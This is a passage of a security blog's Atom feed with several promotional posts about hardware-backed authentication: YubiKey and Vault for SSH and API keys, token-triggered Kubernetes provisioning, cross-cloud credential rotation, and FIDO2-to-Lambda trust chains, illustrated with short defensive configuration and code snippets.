  <li><strong>API platforms</strong> where every customer key is bound to their own hardware token</li>
  <li><strong>Zero-trust networks</strong> where network access requires a physical security key</li>
</ul>

<blockquote>
  <p>“This is a proof of concept — it is <strong>not proof-of-concept-ready</strong>.”</p>
</blockquote>

<p>The disclaimer is honest, but the implications are profound. We’re seeing the early stages of a fundamental shift: from “storing secrets securely” to “not storing secrets at all.”</p>

<hr />

<h2 id="the-future-is-physically-secured">The Future Is Physically Secured</h2>

<p>The elegant simplicity of this architecture reveals a deeper truth: the best way to protect a secret is to ensure it can’t be stolen, because it doesn’t exist in any stealable form.</p>

<p>We’re entering an era where the line between digital and physical security is blurring. Your most critical credentials aren’t stored in a database or encrypted in a vault—they’re locked in silicon, protected by hardware that simply won’t divulge them without physical presence.</p>

<p><strong>So here’s the question that should keep you up at night:</strong> How many of your “secure” secrets could be made infinitely more secure by never storing them at all?</p>

<hr />

<p><strong>Want to explore this architecture yourself?</strong><br />
Check out the full implementation on GitHub: <a href="https://github.com/w8mej/hard-to-get">w8mej/hard-to-get</a></p>

<p>The code is proof-of-concept, but the ideas are proof-of-concept-ready. Perhaps it’s time to rethink what “secret storage” really means.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Hardware Security"/>
    <category term="API Gateway"/>
    <category term="Zero-Trust Architecture"/>
    <category term="YubiKey"/>
    <category term="Terraform"/>
    <category term="HashiCorp Vault"/>
    <category term="Cryptographic Hardening"/>
    <category term="DevSecOps"/>
    <category term="Infrastructure as Code"/>
    <category term="Modern Authentication"/>
    <summary type="html"><![CDATA[We've been thinking about API keys all wrong. What if the secret to unbreakable authentication isn't stored anywhere at all?]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Bending Truths About SSH Authentication That Will Change How You Think About Security</title>
    <link href="https://www.securesql.info/2025/12/07/yubikey-vault-ssh/" rel="alternate" type="text/html" title="5 Mind-Bending Truths About SSH Authentication That Will Change How You Think About Security"/>
    <published>2025-12-07T00:00:00-08:00</published>
    <updated>2025-12-07T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/07/yubikey-vault-ssh</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/07/yubikey-vault-ssh/"><![CDATA[<p>We’ve been doing SSH authentication wrong for decades. Static SSH keys sit on laptops waiting to be stolen. Passwords get phished. Even multi-factor authentication can be bypassed with a well-timed social engineering attack. We’ve accepted these trade-offs because, well, what else is there?</p>

<p>Turns out, there’s a radically different way to think about SSH authentication—one that combines hardware tokens, cryptographic proofs, and stateless verification in a way that makes traditional approaches look almost quaint. Here are five counter-intuitive insights from a proof-of-concept that bridges YubiKey OTP, HashiCorp Vault, and SSH in ways you didn’t know were possible.</p>

<hr />

<h2 id="1-your-ssh-key-can-be-single-use-and-still-work-perfectly"><strong>1. Your SSH Key Can Be Single-Use and Still Work Perfectly</strong></h2>

<p>Think about that for a moment. SSH keys are supposed to be <em>persistent</em>. You generate them once, distribute the public key, and use the private key for years. That’s the mental model we’ve all internalized.</p>

<p>But what if every SSH session used a completely ephemeral certificate that self-destructs after two minutes?</p>

<p>This system does exactly that. Instead of relying on long-lived credentials, it generates a short-lived JWT that serves as an SSH certificate. The certificate contains your SSH public key, but here’s the twist: that public key is only valid for the duration of the JWT’s lifetime (120 seconds, in this implementation).</p>

<blockquote>
  <p>“Password-less, single-use, fully auditable in Vault logs”</p>
</blockquote>

<p>No key rotation. No certificate revocation lists. No wondering if an old laptop in a drawer somewhere still has valid credentials. The authentication material literally expires faster than it takes you to make coffee.</p>

<p><strong>Why this matters:</strong> In a world drowning in credential compromise, the best defense isn’t stronger passwords or better key management—it’s credentials that cease to exist before an attacker can use them.</p>

<hr />

<h2 id="2-otp-and-ssh-live-in-different-universesexcept-they-dont"><strong>2. OTP and SSH Live in Different Universes—Except They Don’t</strong></h2>

<p>One-Time Passwords belong to the world of web logins, TOTP apps, and SMS codes. SSH belongs to the realm of public-key cryptography, certificate authorities, and authorized_keys files. These are fundamentally different authentication paradigms.</p>

<p>Or so we thought.</p>

<p>This architecture proves that OTP can become a <strong>cryptographically verifiable proof of possession</strong> for SSH—by having Vault <em>sign</em> the OTP. The YubiKey generates a one-time password, Vault cryptographically signs it using its Transit engine, and that signature becomes part of a JWT that the SSH server can verify.</p>

<p>The OTP itself is never transmitted in plaintext. It’s signed, packaged, and verified—transforming a traditionally “something you have” factor into a non-repudiable cryptographic assertion.</p>

<blockquote>
  <p>“By letting Vault sign the OTP, the OTP becomes a verifiable proof of possession usable for SSH login — enabling stateless, hardware-backed SSH MFA.”</p>
</blockquote>

<p><strong>The insight:</strong> When you can cryptographically bind an OTP to a public key and verify both together, you’re not just adding MFA to SSH—you’re creating an entirely new authentication primitive.</p>

<hr />

<h2 id="3-the-ssh-server-doesnt-need-to-store-anything-about-you"><strong>3. The SSH Server Doesn’t Need to Store Anything About You</strong></h2>

<p>Traditional SSH authentication requires the server to maintain some state about who you are: an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, a certificate authority it trusts, a user database, <em>something</em>. Even “passwordless” systems typically require pre-provisioning public keys.</p>

<p>This system? The SSH server knows nothing about you until the moment you authenticate.</p>

<p>When you attempt to connect, the server runs a <code class="language-plaintext highlighter-rouge">PrincipalsCommand</code> script that validates your JWT against Vault’s public key. If the JWT is valid—meaning it was recently issued by a trusted Vault instance, contains the correct audience claim, and hasn’t expired—the server grants access on the spot.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AuthorizedPrincipalsCommand /usr/local/bin/verify_ssh_jwt.sh %u %k
AuthorizedPrincipalsCommandUser vault
</code></pre></div></div>

<p>No pre-enrollment. No allowlists. No database lookups. The trust model is entirely external: “If Vault vouched for you in the last two minutes, you’re in.”</p>

<p><strong>Why this is radical:</strong> This is zero-trust authentication taken to its logical extreme. The SSH server doesn’t trust <em>you</em>—it trusts <em>Vault’s assertion about you</em>, and only for 120 seconds.</p>

<hr />

<h2 id="4-physical-security-and-cryptographic-proof-arent-separate-things-anymore"><strong>4. Physical Security and Cryptographic Proof Aren’t Separate Things Anymore</strong></h2>

<p>We usually think of hardware tokens (like YubiKeys) as <em>physical</em> security: something you have to physically touch to prove possession. Cryptographic signatures, meanwhile, are <em>logical</em> security: mathematical proof that a message came from a specific key.</p>

<p>This system collapses that distinction.</p>

<p>When you touch your YubiKey to generate an OTP, that OTP is immediately signed by Vault’s Transit engine with your SSH public key as context. The resulting signature binds three things together in a single cryptographic proof:</p>

<ol>
  <li><strong>Physical possession</strong> (you touched the YubiKey right now)</li>
  <li><strong>Cryptographic identity</strong> (this is your SSH public key)</li>
  <li><strong>Temporal validity</strong> (this happened within the last 120 seconds)</li>
</ol>

<p>The SSH server verifies all three simultaneously by checking the JWT. There’s no “step one: verify the physical token, step two: verify the key”—it’s one atomic verification.</p>

<blockquote>
  <p>“OTP provides physical possession proof (touch YubiKey). Vault Transit signing ensures OTP integrity &amp; ties it to the key.”</p>
</blockquote>

<p><strong>The implication:</strong> When hardware and cryptography fuse like this, you get authentication that’s resistant to both physical <em>and</em> digital attack vectors in ways that neither could achieve alone.</p>

<hr />

<h2 id="5-auditability-happens-by-default-not-as-an-afterthought"><strong>5. Auditability Happens by Default, Not as an Afterthought</strong></h2>

<p>Ask a security team about their SSH access logs and you’ll usually hear about host-based logging, centralized syslog, maybe some SIEM integration if they’re sophisticated. But audit trails are always retrofitted—you build the access mechanism first, then figure out logging later.</p>

<p>This architecture inverts that.</p>

<p>Because every authentication flows through Vault, every login attempt is automatically logged in Vault’s audit system before the SSH connection even succeeds. You get:</p>

<ul>
  <li><strong>Who</strong> requested access (the <code class="language-plaintext highlighter-rouge">sub</code> claim in the JWT)</li>
  <li><strong>When</strong> they requested it (JWT issuance timestamp)</li>
  <li><strong>What</strong> key they used (the <code class="language-plaintext highlighter-rouge">ssh_cert</code> claim)</li>
  <li><strong>Which</strong> YubiKey OTP they presented (the <code class="language-plaintext highlighter-rouge">otp_sig</code> claim)</li>
</ul>

<p>And because the OTP is cryptographically signed, the logs are tamper-evident. You can prove not just <em>that</em> someone accessed a system, but that they possessed specific hardware at a specific time.</p>

<p><strong>The deeper truth:</strong> When authentication and audit are the same operation—when you literally cannot authenticate without creating an audit trail—security becomes something you can’t opt out of, even by accident.</p>

<hr />

<h2 id="what-this-means-for-the-future"><strong>What This Means for the Future</strong></h2>

<p>The conventional wisdom about SSH is that it’s a solved problem: keys work, certificates work, and if you want MFA you can add it on top. We’ve optimized password rotation, key escrow, and certificate lifecycles because we assumed those were the constraints we had to work within.</p>

<p>But what if the constraints themselves were wrong?</p>

<p>This proof-of-concept suggests a different future: one where authentication is stateless, ephemeral, and hardware-backed by default. Where audit trails are cryptographic byproducts rather than operational overhead. Where “zero-trust” isn’t a buzzword but a literal architectural property—the server trusts nothing except real-time cryptographic assertions.</p>

<p>We’re not quite there yet. This is still a proof-of-concept, with rough edges and deployment challenges. But the underlying ideas—OTP as cryptographic proof, JWT as portable trust, Vault as stateless verifier—point toward authentication patterns that feel impossibly elegant once you see them.</p>

<p>The real question isn’t whether this specific implementation will take over the world. It’s whether, five years from now, we’ll look back at persistent SSH keys the same way we now look at FTP passwords: a necessary compromise from an era before we knew better.</p>

<p><strong>Are we ready to rethink authentication from first principles—or are we too invested in securing yesterday’s architecture?</strong></p>

<hr />

<h2 id="try-it-yourself"><strong>Try It Yourself</strong></h2>

<p>Want to experiment with this approach? The complete implementation, including setup scripts and configuration examples, is available in the GitHub repository:</p>

<p>👉 <strong><a href="https://github.com/w8mej/knock-knock-ssh">Visit the knock-knock-ssh repository</a></strong> to explore the code, try the proof-of-concept, and see stateless SSH authentication in action.</p>

<p>The future of authentication might be stateless, hardware-backed, and ephemeral. And you can start testing that future today.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Hardware Security"/>
    <category term="Zero Trust Architecture"/>
    <category term="Cryptographic Authentication"/>
    <category term="SSH Security"/>
    <category term="YubiKey"/>
    <category term="HashiCorp Vault"/>
    <category term="Passwordless Authentication"/>
    <category term="JWT"/>
    <category term="OTP"/>
    <category term="Security Innovation"/>
    <summary type="html"><![CDATA[We've been doing SSH authentication wrong for decades. What if I told you that your SSH keys, password managers, and even your carefully rotated credentials are all solving yesterday's problem?]]></summary>
  </entry>
  <entry>
    <title type="html">Forget HR Systems: Why Your Next Identity Provider Should Be a Piece of Plastic</title>
    <link href="https://www.securesql.info/2025/12/06/infrastructure-as-identity/" rel="alternate" type="text/html" title="Forget HR Systems: Why Your Next Identity Provider Should Be a Piece of Plastic"/>
    <published>2025-12-06T00:00:00-08:00</published>
    <updated>2025-12-06T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/06/infrastructure-as-identity</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/06/infrastructure-as-identity/"><![CDATA[<p>We’ve all been there. You start a new job, and the “onboarding” process is a week-long saga of waiting for tickets to close, permissions to propagate, and accounts to be provisioned. It’s the digital equivalent of waiting in line at the DMV. But what if it didn’t have to be that way? What if the moment you plugged in your security key, the entire infrastructure you needed just… appeared?</p>

<p>I recently explored a fascinating proof-of-concept that flips the traditional onboarding model on its head. Instead of relying on a sprawling web of HR systems and manual approvals, it uses a physical hardware token as the absolute source of truth. It’s a concept I’m calling “Infrastructure as Identity,” and it’s as radical as it sounds.</p>

<p>Here are the three most surprising takeaways from this experiment in extreme automation.</p>

<h3 id="1-hardware-is-the-new-identity-provider">1. Hardware is the New Identity Provider</h3>

<p>In most organizations, “identity” is a row in a database managed by HR. This project challenges that assumption by making the <strong>YubiKey itself</strong> the primary trigger for existence within the system.</p>

<blockquote>
  <p>“The hardware token itself is the source of truth — once the serial is recorded, identity + infra appear automatically.”</p>
</blockquote>

<p>This is counter-intuitive because we’re used to thinking of hardware tokens as <em>second</em> factors—something you use <em>after</em> you’ve established who you are. By elevating the physical token to the primary identifier, we eliminate the gap between “having the key” and “having access.” If you hold the key, the infrastructure knows you, and more importantly, it builds itself for you. It’s a tangible, physical anchor in an increasingly ephemeral cloud world.</p>

<h3 id="2-the-null-resource-power-move">2. The “Null Resource” Power Move</h3>

<p>Terraform is famous for managing cloud resources like VMs and load balancers. But this project uses a humble <code class="language-plaintext highlighter-rouge">null_resource</code> to orchestrate a complex dance between physical hardware and digital identity.</p>

<p>By using a local script to read the YubiKey’s serial number and fire it off to the Vault API, the system bridges the air-gapped world of USB ports with the cloud-native world of HashiCorp Vault. It’s a reminder that sometimes the most powerful automation tools aren’t the ones with the flashiest features, but the ones that allow us to glue disparate worlds together. This “glue code” isn’t just a script; it’s the translator that turns a physical connection into a digital identity.</p>

<h3 id="3-zero-touch-namespace-provisioning">3. Zero-Touch Namespace Provisioning</h3>

<p>The “magic trick” of this setup is what happens after the key is registered. There is no ticket to IT. There is no manual creation of a Kubernetes namespace.</p>

<p>Once the YubiKey serial is mapped to a Vault entity, Terraform Cloud wakes up. It sees the new identity and automatically provisions a dedicated Kubernetes namespace and a ServiceAccount bound to that specific Vault policy.</p>

<blockquote>
  <p>“A single hardware token → Vault Identity → Kubernetes namespace.”</p>
</blockquote>

<p>This is the definition of “Zero Touch.” The infrastructure reacts to the presence of the user (represented by the key) rather than the user asking for the infrastructure. It shifts the paradigm from “request and wait” to “arrive and receive.” It suggests a future where our environments are as fluid and responsive as the devices we carry.</p>

<h3 id="summary">Summary</h3>

<p>This project is a glimpse into a future where security and convenience aren’t enemies, but partners. By treating a physical token as the root of trust for infrastructure provisioning, we can eliminate friction and increase security simultaneously. It forces us to ask: <strong>If our infrastructure can react to a physical key, what else can it react to?</strong></p>

<p>Are we ready for a world where our digital environments assemble themselves the moment we walk in the door?</p>

<p><em>Curious to see the code behind the concept? Check out the <a href="https://github.com/w8mej/token-effort">repository on GitHub</a>.</em></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Infrastructure as Identity"/>
    <category term="Zero Trust"/>
    <category term="YubiKey"/>
    <category term="HashiCorp Vault"/>
    <category term="Terraform"/>
    <category term="Kubernetes"/>
    <category term="Automation"/>
    <summary type="html"><![CDATA[We've spent decades building complex identity pipelines rooted in databases and HR software. What if the single source of truth for your entire infrastructure was something you could hold in your hand?]]></summary>
  </entry>
  <entry>
    <title type="html">5 Surprising Lessons from Building a Cross-Cloud Credential Rotator</title>
    <link href="https://www.securesql.info/2025/12/05/cross-cloud-credential-rotation/" rel="alternate" type="text/html" title="5 Surprising Lessons from Building a Cross-Cloud Credential Rotator"/>
    <published>2025-12-05T00:00:00-08:00</published>
    <updated>2025-12-05T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/05/cross-cloud-credential-rotation</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/05/cross-cloud-credential-rotation/"><![CDATA[<p>We’ve all been there: the dreaded 3 AM pager duty alert because a database password expired, or worse, a credential leaked and you’re scrambling to rotate it across a dozen microservices. Now, imagine that database lives in one cloud, your application lives in another, and you need to rotate the keys for <em>both</em> simultaneously without downtime.</p>

<p>It sounds like a distributed systems nightmare, doesn’t it?</p>

<p>I recently built a Proof of Concept (PoC) to solve exactly this problem—automating credential rotation between AWS RDS and Oracle Cloud Infrastructure (OCI) Autonomous Database. What started as a simple script evolved into a deep dive into the nuances of multi-cloud security. Here are the five most surprising lessons I learned along the way.</p>

<h3 id="1-true-multi-cloud-portability-is-a-container">1. True Multi-Cloud Portability is a Container</h3>

<p>When we talk about “multi-cloud,” we often picture complex abstraction layers or heavy tools like Terraform trying to bridge the gap. But the most effective bridge turned out to be the humble container image.</p>

<p>In this project, the exact same Docker image powers the rotation logic on both AWS Lambda and OCI Functions. By packaging the Python runtime, the Oracle Instant Client, and the AWS SDK into a single immutable artifact, we eliminate the “it works on my machine” (or “it works in my region”) problem entirely.</p>

<blockquote>
  <p><strong>Takeaway:</strong> Don’t build separate rotators for separate clouds. Build one logic engine, containerize it, and let the cloud providers just be the execution runtime.</p>
</blockquote>

<h3 id="2-split-brain-is-the-enemy">2. Split-Brain is the Enemy</h3>

<p>The scariest part of rotating credentials in two places is the “split-brain” scenario: what if the password update succeeds in AWS but fails in OCI? Your application, reading from the old secret, would suddenly be locked out of the database.</p>

<p>To combat this, the rotation worker implements a strict rollback mechanism. If the OCI rotation fails, it immediately attempts to revert the AWS RDS password to its previous state.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="c1"># Attempt rollback of RDS to previous password to avoid split-brain
</span>        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">changed</span><span class="p">[</span><span class="s">"rds"</span><span class="p">]:</span>
                <span class="c1"># ... connect and revert ...
</span>                <span class="n">alter_user_postgres</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">current_user</span><span class="p">,</span> <span class="n">current_password</span><span class="p">)</span>
</code></pre></div></div>

<p>This isn’t just error handling; it’s a survival strategy for distributed consistency.</p>

<h3 id="3-security-is-ephemeral">3. Security is Ephemeral</h3>

<p>Handling Oracle Wallets (the credential files needed to connect to an Autonomous Database) is notoriously tricky. You can’t just check them into git, and baking them into the image is a security sin.</p>

<p>The solution? Treat them as ephemeral state. The worker dynamically retrieves the wallet from a secure source (like OCI Object Storage or a pre-authenticated URL) at runtime, unzips it to the container’s temporary <code class="language-plaintext highlighter-rouge">/tmp</code> directory, uses it for the connection, and lets it vanish when the container dies.</p>

<blockquote>
  <p><strong>Takeaway:</strong> The most secure file is the one that doesn’t exist when you’re done with it.</p>
</blockquote>

<h3 id="4-trust-but-verify-cryptographically">4. Trust, but Verify (Cryptographically)</h3>

<p>Logging is essential, but how do you trust your logs in a compromised environment? If an attacker gains access, they could easily doctor the text files.</p>

<p>This project implements an HMAC-signed audit trail. Every rotation event is hashed with a secret salt (stored securely in SSM or OCI Vault) before being written to cold storage.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">digest</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">msg</span><span class="o">=</span><span class="n">message</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span>
                      <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
</code></pre></div></div>

<p>This ensures that the audit log is tamper-evident. If the hash doesn’t match the message, you know something is wrong. It’s a small touch that adds a massive layer of integrity.</p>

<h3 id="5-proof-of-concept-doesnt-mean-insecure">5. “Proof of Concept” Doesn’t Mean “Insecure”</h3>

<p>There’s a temptation to cut corners in a PoC—”I’ll add SSL later,” or “I’ll fix the IAM policies in production.” But security debt is the hardest debt to pay down.</p>

<p>Even in this demo, we enforced:</p>
<ul>
  <li><strong>SSL/TLS</strong> for all database connections.</li>
  <li><strong>Least Privilege IAM</strong> roles, scoped down to specific ARNs and OCIDs.</li>
  <li><strong>Image Scanning</strong> hooks in the <code class="language-plaintext highlighter-rouge">Makefile</code> to catch vulnerabilities before deployment.</li>
</ul>

<p>It proves that “secure by default” isn’t just a slogan; it’s a development habit.</p>

<h3 id="summary">Summary</h3>

<p>Building a cross-cloud credential rotator taught me that the challenges aren’t just about APIs or SDKs—they’re about consistency, atomicity, and trust. Whether you’re managing a massive enterprise fleet or just a side project, these principles of ephemeral state, cryptographic verification, and containerized portability are your best defense against the chaos of the cloud.</p>

<p><strong>What about you?</strong> How are you handling the friction between your multi-cloud security policies? It might be time to look at your rotation strategy with fresh eyes.</p>

<p><strong>Check out the code:</strong> Dive into the details and star the repository on GitHub: <a href="https://github.com/w8mej/dizzy-keys">https://github.com/w8mej/dizzy-keys</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Security"/>
    <category term="DevSecOps"/>
    <category term="AWS"/>
    <category term="OCI"/>
    <category term="Serverless"/>
    <category term="Automation"/>
    <summary type="html"><![CDATA[Managing secrets across one cloud is hard. Managing them across two, synchronously, is a masterclass in distributed systems engineering.]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Blowing Insights About Hardware-Backed Authentication That Will Change How You Think About Cloud Security</title>
    <link href="https://www.securesql.info/2025/12/04/fido2/" rel="alternate" type="text/html" title="5 Mind-Blowing Insights About Hardware-Backed Authentication That Will Change How You Think About Cloud Security"/>
    <published>2025-12-04T00:00:00-08:00</published>
    <updated>2025-12-04T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/04/fido2</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/04/fido2/"><![CDATA[<p>We’ve all been there: another leaked API key, another compromised credential, another midnight emergency call. The traditional approach to cloud security—rotating passwords, managing access keys, praying nobody commits secrets to GitHub—feels like fighting a losing battle. But what if I told you there’s a radically different way to think about this problem, one that eliminates passwords entirely and creates an unbroken chain of hardware-backed trust from your physical key to your serverless functions?</p>

<p>I recently dove into an architecture that connects YubiKey FIDO2 authentication through an OIDC identity provider to HashiCorp Vault, which then provisions AWS Lambda functions via Terraform—and the implications are far more profound than just “passwordless login.” Here are five counter-intuitive insights that completely changed how I think about modern cloud security.</p>

<hr />

<h2 id="1-your-lambda-functions-can-prove-their-identity-without-storing-any-secrets"><strong>1. Your Lambda Functions Can Prove Their Identity Without Storing Any Secrets</strong></h2>

<p>This sounds impossible at first. How can a Lambda function authenticate to retrieve secrets without… having secrets to authenticate with? The traditional approach is a vicious cycle: you need credentials to get credentials.</p>

<p>The breakthrough here is <strong>AWS IAM authentication combined with Vault’s AWS auth method</strong>. When your Lambda function starts, it can prove its identity using AWS’s IAM signing process—essentially using AWS’s own infrastructure as the authentication mechanism. The Lambda’s IAM role becomes its identity.</p>

<p>Here’s why this matters: zero embedded secrets. No environment variables with tokens, no hardcoded API keys, no encrypted configuration files that still need decryption keys. The Lambda proves “I am this specific IAM role” to Vault, and Vault responds with a short-lived token to access secrets.</p>

<blockquote>
  <p><strong>“Lambda proves identity to Vault; no embedded secrets.”</strong></p>
</blockquote>

<p>This fundamentally inverts the security model. Instead of protecting static credentials, you’re leveraging the cloud provider’s own identity system. It’s elegant, phishing-resistant, and eliminates an entire class of vulnerabilities.</p>

<hr />

<h2 id="2-fido2-isnt-just-about-logging-inits-about-creating-an-audit-trail-from-hardware-to-code"><strong>2. FIDO2 Isn’t Just About Logging In—It’s About Creating an Audit Trail from Hardware to Code</strong></h2>

<p>When most people think about FIDO2 and YubiKeys, they think “multi-factor authentication” or “passwordless login.” True, but incomplete.</p>

<p>What’s truly revolutionary is that FIDO2 creates a <strong>verifiable chain of custody from physical hardware to deployed infrastructure</strong>. When you touch your YubiKey to authenticate, you’re not just proving you’re human—you’re creating a cryptographic link between a physical device and the infrastructure changes that follow.</p>

<p>Here’s the flow:</p>
<ol>
  <li>YubiKey FIDO2 authentication → Dex issues OIDC token</li>
  <li>OIDC token → Vault issues time-limited token</li>
  <li>Vault token → Terraform provisions infrastructure</li>
  <li>Terraform-created IAM role → Lambda authenticates to Vault</li>
  <li>Lambda retrieves secrets for runtime</li>
</ol>

<p>Every step is auditable. Every step is cryptographically verified. You can trace every deployed Lambda function back to the specific hardware key that authorized the deployment.</p>

<p>In incident response scenarios, this is game-changing. “Which engineer deployed the compromised function?” becomes a forensically answerable question with hardware-backed proof.</p>

<hr />

<h2 id="3-infrastructure-as-code-and-secret-management-are-actually-the-same-problem"><strong>3. Infrastructure-as-Code and Secret Management Are Actually the Same Problem</strong></h2>

<p>Here’s a subtle insight buried in this architecture: the same Terraform code that provisions your Lambda function also stores the secrets it will consume.</p>

<p>Look at this elegant symmetry:</p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># secret.tf – Terraform stores the secret in Vault</span>
<span class="nx">resource</span> <span class="s2">"vault_kv_secret_v2"</span> <span class="s2">"api_key"</span> <span class="p">{</span>
  <span class="nx">mount</span> <span class="p">=</span> <span class="s2">"kv"</span>
  <span class="nx">name</span>  <span class="p">=</span> <span class="s2">"lambda/api-key"</span>
  <span class="nx">data_json</span> <span class="p">=</span> <span class="nx">jsonencode</span><span class="err">(</span><span class="p">{</span>
    <span class="nx">key</span> <span class="p">=</span> <span class="s2">"super-secret-api-key-123"</span>
  <span class="p">}</span><span class="err">)</span>
<span class="p">}</span>

<span class="c1"># lambda.tf – Terraform provisions the Lambda</span>
<span class="nx">resource</span> <span class="s2">"aws_lambda_function"</span> <span class="s2">"demo"</span> <span class="p">{</span>
  <span class="nx">function_name</span> <span class="p">=</span> <span class="s2">"vault-demo"</span>
  <span class="c1"># ... configuration</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Traditional approaches separate these concerns: developers write infrastructure code, security teams manage secrets separately, and those two worlds collide in brittle, error-prone ways.</p>

<p>This architecture says: <strong>secrets and infrastructure are lifecycle twins</strong>. They’re provisioned together, versioned together, and revoked together. When you run <code class="language-plaintext highlighter-rouge">terraform apply</code>, you’re establishing the complete security context in one atomic operation.</p>

<p>The implication? Your Git history becomes your security audit log. Every secret rotation, every permission change, every infrastructure modification—all version controlled, all peer reviewed, all traceable.</p>

<hr />

<h2 id="4-zero-trust-starts-with-zero-passwordseven-for-service-to-service-communication"><strong>4. “Zero Trust” Starts With Zero Passwords—Even for Service-to-Service Communication</strong></h2>

<p>We hear “zero trust” thrown around constantly, but what does it actually mean? This architecture provides a concrete answer: <strong>no entity in the system, human or machine, ever uses a password</strong>.</p>

<ul>
  <li><strong>Humans</strong> → YubiKey FIDO2 (cryptographic proof, not knowledge-based)</li>
  <li><strong>Terraform</strong> → Short-lived OIDC-issued Vault tokens (expires in ~1 hour)</li>
  <li><strong>Lambda</strong> → AWS IAM role authentication (identity bound to execution context)</li>
</ul>

<p>Even the communication between services is ephemeral. The Vault token Terraform uses expires quickly. The Lambda’s authentication is per-invocation. There are no “service accounts” with static passwords persisting for months.</p>

<p>Why does this matter? <strong>Credential theft becomes exponentially harder</strong>. Even if an attacker compromises a running Lambda, they get access for that single invocation—no persistent credential to exfiltrate. The blast radius of any compromise shrinks dramatically.</p>

<p>This isn’t theoretical security posturing. This is operational zero trust: every request is authenticated, every token is short-lived, and the entire system degrades gracefully under attack.</p>

<hr />

<h2 id="5-code-signing-and-vpc-isolation-are-first-class-citizens-not-afterthoughts"><strong>5. Code Signing and VPC Isolation Are First-Class Citizens, Not Afterthoughts</strong></h2>

<p>Here’s what shocked me most: this implementation doesn’t just demonstrate the happy path—it shows production-grade hardening that most tutorials skip entirely.</p>

<p>The Terraform configuration includes:</p>

<ul>
  <li><strong>Code signing enforcement</strong>: Only cryptographically signed Lambda artifacts can deploy</li>
  <li><strong>VPC attachment</strong>: Lambda runs in private subnets with controlled egress</li>
  <li><strong>Dead Letter Queues</strong>: Failed invocations are captured for forensic analysis</li>
  <li><strong>Reserved concurrency</strong>: Protection against noisy-neighbor effects</li>
  <li><strong>KMS-encrypted DLQ</strong>: Even failure logs are encrypted at rest</li>
</ul>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">resource</span> <span class="s2">"aws_lambda_code_signing_config"</span> <span class="s2">"this"</span> <span class="p">{</span>
  <span class="nx">allowed_publishers</span> <span class="p">{</span>
    <span class="nx">signing_profile_version_arns</span> <span class="p">=</span> <span class="p">[</span><span class="nx">aws_signer_signing_profile</span><span class="err">.</span><span class="nx">lambda</span><span class="err">.</span><span class="nx">arn</span><span class="p">]</span>
  <span class="p">}</span>
  <span class="nx">policies</span> <span class="p">{</span>
    <span class="nx">untrusted_artifact_on_deployment</span> <span class="p">=</span> <span class="s2">"Enforce"</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This isn’t security theater—it’s <strong>defense in depth baked into the infrastructure definition</strong>. You can’t deploy unsigned code. You can’t accidentally expose the Lambda to the public internet. You can’t exceed concurrency limits.</p>

<p>What’s profound is that these protections aren’t bolt-on security tools requiring separate configuration. They’re part of the same Terraform code that deploys the function. Security and functionality are indivisible.</p>

<hr />

<h2 id="the-real-takeaway-security-is-an-architecture-not-a-feature"><strong>The Real Takeaway: Security Is an Architecture, Not a Feature</strong></h2>

<p>If you walked away thinking “this is a cool way to use YubiKeys with Lambda,” you missed the point.</p>

<p>The real insight is architectural: <strong>when you eliminate static credentials and create hardware-backed identity chains, security stops being something you add to your system and becomes something your system is built from</strong>.</p>

<p>Every component in this architecture—Dex, Vault, Terraform, AWS IAM—plays a role in an unbroken trust chain. Remove any link, and the chain breaks. Add them together, and you get emergent security properties: auditability, revocability, time-bounded access, and hardware-backed proof.</p>

<p>This is the future of cloud security. Not more tools, not more dashboards, but fundamentally different architectural patterns that make the insecure path the hard path.</p>

<hr />

<p><strong>So here’s my question for you</strong>: If you could eliminate every password and API key from your infrastructure tomorrow, what would you do differently? What would you build that’s currently too risky? What experiments would you run?</p>

<p>The tools exist. The patterns are proven. The only question is: are you ready to rethink the fundamentals?</p>

<hr />

<h2 id="want-to-see-it-in-action"><strong>Want to See It In Action?</strong></h2>

<p>The complete implementation—including Terraform configurations, Lambda code, Vault policies, and Dex setup—is available on GitHub:</p>

<p>👉 <strong><a href="https://github.com/w8mej/touch-and-go">Check out the repository: touch-and-go</a></strong></p>

<p>Explore the code, try it yourself, and see how hardware-backed authentication chains can transform your cloud security posture. All the components are proof-of-concept-ready and ready to adapt to your infrastructure.</p>

<p><em>Star the repo if you found this useful, and feel free to open issues or contribute improvements!</em></p>

<p>https://github.com/w8mej/touch-and-go</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Security"/>
